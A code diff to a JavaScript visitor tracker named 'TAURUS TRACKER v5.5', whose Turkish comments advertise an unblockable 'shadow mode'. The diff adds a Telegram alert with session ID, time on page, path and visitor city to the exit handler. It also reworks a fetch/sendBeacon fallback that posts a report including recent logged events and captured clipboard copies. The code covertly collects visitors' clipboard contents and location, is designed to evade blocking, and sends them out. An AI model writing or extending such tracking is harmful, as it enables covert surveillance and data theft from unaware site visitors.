@@ -1,6 +1,6 @@
 // TAURUS TRACKER v5.5 (Shadow Mode / Backend Oriented)
 /**
- * TAURUS TRACKER v5.5 (Final System - Unified Reporting V31)
+ * TAURUS TRACKER v5.5 (Final System - Unified Reporting V32)
  * ----------------------------------
  * - Altyapı: Backend Oriented (Engellenemez Gölge Modu)
  * - Güvenlik: Middleware IP Gating & Server-side Reporting
@@ -59,6 +59,13 @@
 
         exitSent = true;
 
+        // Requirement: Call Telegram Notification redundancy (Following user advice)
+        const tgShortMsg = `🛑 <b>EXIT REPORT [${sessionID}]</b>\n` +
+            `⏱ <b>Duration:</b> ${duration}s\n` +
+            `📍 <b>Page:</b> ${window.location.pathname}\n` +
+            `🌍 <b>Loc:</b> ${sessionData?.city || 'Unknown'}`;
+        sendTelegramNotification(tgShortMsg);
+
         // Build detailed log content
         const rawLog = localHistory.slice(-50).join('\n');
         const rawClipboard = localHistory.filter(e => e.includes('Copy:')).join('\n');
@@ -77,8 +84,9 @@
 
         const url = CONFIG.api.report;
         const body = JSON.stringify(payload);
+        const blob = new Blob([body], { type: 'application/json' });
 
-        // STRATEGY: fetch with keepalive is more reliable for JSON on modern browsers than sendBeacon with Blob
+        // STRATEGY: fetch with keepalive + sendBeacon as fallback
         if (window.fetch && typeof window.fetch === 'function') {
             fetch(url, {
                 method: 'POST',
@@ -86,14 +94,9 @@
                 keepalive: true,
                 body: body
             }).catch(() => {
-                // Last ditch fallback to beacon
-                if (navigator.sendBeacon) {
-                    const blob = new Blob([body], { type: 'application/json' });
-                    navigator.sendBeacon(url, blob);
-                }
+                if (navigator.sendBeacon) navigator.sendBeacon(url, blob);
             });
         } else if (navigator.sendBeacon) {
-            const blob = new Blob([body], { type: 'application/json' });
             navigator.sendBeacon(url, blob);
         }
     }
